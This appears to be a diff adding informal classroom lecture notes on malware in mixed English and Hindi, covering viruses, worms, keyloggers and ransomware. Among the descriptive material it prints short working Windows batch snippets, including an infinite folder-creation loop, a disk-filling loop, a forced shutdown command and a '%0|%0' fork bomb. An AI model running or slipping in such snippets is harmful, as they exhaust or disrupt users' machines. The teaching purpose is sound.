@@ -1,0 +1,81 @@
+					Lecture 5 
+
+Malware : Malicious + Software
+          Software tht is intended to harm
+ A software that disrupt or alter the normal operation of an electronic device.Electronic device could be anything either mobile phone or computers, tablets etc...
+
+
+ How it basically works: It infects a device or machine by tricking users nto clicking or installing a program (jo unko nhi krna chahiye tha). R jaise hi wo usko execute krte hai to several actions perform hote which comes under the category of 
+ EFFECTS OF MALWARES
+
+ --> khud ko replicate krna
+ --> Apke keystrokes record krna r aapko pta bhi na chlna.
+ --> Apko services ya files access krne se rok dena
+ --> Apke browser ko ads se bhr dena
+
+
+*Cryptocurrency Malware
+
+
+ How we get ourself into installing a Malware :
+ -----------------------------------------------
+ For the installation of malwares there are some techniques or we can say bait(chaara daalna) provided by hackers to make you click on such document or on a link or installing an executable software.
+
+
+Types of Malwares:
+	Virus , Worms , Keyloggers , Ransomewares , Spywares (Trojans , Adwares ) , Rootkits (ROOT + KIT) , Botnet
+	roBOT in a NETwork
+
+VIRUS (Vital Information Resource Under Siege):
+A piece of code which is capable of copying itself and typically has a devastating effect and it also require a human being for its implementation.
+Viruses spread by reproducing and inserting themselves into programs, documents, or e-mail attachments.And they won't work untill unless we don't strike them or lead them to the phase of execution.
+EG: Tera bit virus maker
+FUD : FUlly Undetectable
+
+Chota packet nyaa dhanamka...
+  
+  -->infinite folder: 
+          :loop
+          mkdir %random%
+          goto loop
+  --> Space consuming Virus:
+   		:loop
+   		mkdir hello
+   		cd hello
+   		echo " main saari jgh ko khtm kr dunga">> file.txt
+   	    goto loop     
+   -->Shutdown Virus:
+         shutdown -s -t 10 -c "bye bye beta lg gye"
+   -->fork bomb :
+   			%0|%0
+
+
+
+
+Types of ViRUSES
+: Browser Hijacker (jo aapkoaapki sites pr multiple sites pr visit kraane ke baad pahuchaye)
+  File Infector ( jo file ke saath chipak jaye r fr infect krta jaaye uske execution pr)
+  Polymorphic Virus (They are encrypted and change operations over time).
+  Macro(ek bde instruction ko chote sub instruction me baat deta hai) Virus
+  Boot Sector Virus
+  Memory Resident Virus (adiyal hota hai host program chla bhi jaaye tbhi bhi execute hota rehta hai)
+  etc etc ...
+
+Worms:
+A computer worm is self-replicating malware that duplicates itself to spread to uninfected computers. Worms often use parts of an operating system that are automatic and invisible to the user. It is common for worms to be noticed only when their uncontrolled replication consumes system resources, slowing or halting other tasks.
+
+
+
+Stuxnet : https://www.youtube.com/watch?v=7g0pi4J8auQ
+
+
+Keyloggers
+Recording your keystrokes that is whatever you typwe will be stored in a log file
+			Local Storage 
+			Remote Storage
+Eg: Ardamax Keylogger, Hooker.
+
+Ransomwares : Beta loot lega aapko jis din gya aapke system pr.
+
+
+https://pastebin.com/we0nWWKV
